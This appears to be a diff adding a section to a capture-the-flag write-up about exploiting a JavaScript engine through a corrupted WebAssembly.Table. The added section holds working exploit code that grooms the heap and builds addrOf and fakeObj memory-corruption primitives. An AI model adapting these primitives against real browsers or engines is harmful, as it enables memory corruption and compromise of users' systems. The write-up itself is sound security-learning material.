@@ -120,6 +120,72 @@ for (let i = 0; i < 4; i++) {
 print(table.get(0).length);
 ```
 
+Our table length should now be a much larger value than the original 0x100, as it has been overwriten by a pointer.
+
+### addrOf and fakeObj primitives
+
+I had to slightly modify the above PoC to add more corrupted arrays, as allocating a new array sometimes claimed the old object and replaced the pointer to the corrupted butterfly.
+
+We can then allocate many arrays which store a single `undefined` element to groom the heap, so that the next array with a single `undefined` element will at an address that is a little higher than the corrupted butterfly.
+
+Using the corrupted butterfly, we can read the object pointer in this new array as a a float, thus creating our addrOf primitive.
+We can also write a float into the new array to have an arbitrary address treated as a pointer to an object, this creating our fakeObj primitive.
+
+```js
+const table = new WebAssembly.Table({
+    element: "externref",
+    initial: 0,
+});
+
+gc();
+
+for (let i = 0; i < 8; i++) {
+    table.grow(1, new Array(0x100).fill(1.1));
+}
+
+edenGC();
+
+for (let i = 0; i < 0x1000; i++) {
+    new Uint8Array(new ArrayBuffer(1));
+}
+
+gc();
+
+for (let i = 0; i < 0x100; i++) {
+    [undefined];
+}
+
+const object_arr = [undefined];
+const float_helper = new DataView(new ArrayBuffer(8));
+
+function itof(x) {
+    float_helper.setBigUint64(0, x, true);  
+    return float_helper.getFloat64(0, true);
+}
+
+function ftoi(x) {
+    float_helper.setFloat64(0, x, true);
+    return float_helper.getBigUint64(0, true);
+}
+
+function addrOf(obj) {
+    object_arr[0] = obj;
+    return ftoi(table.get(0)[0x2888]);
+}
+
+function fakeObj(addr) {
+    table.get(0)[0x2888] = itof(addr);
+    return object_arr[0];
+}
+
+o = {'a': 1.1}
+
+print(describe(fakeObj(addrOf(o))));
+print(describe(o));
+```
+
+The print statements at the end should be describing the exact same object.
+
 ## Flag
 
 ```
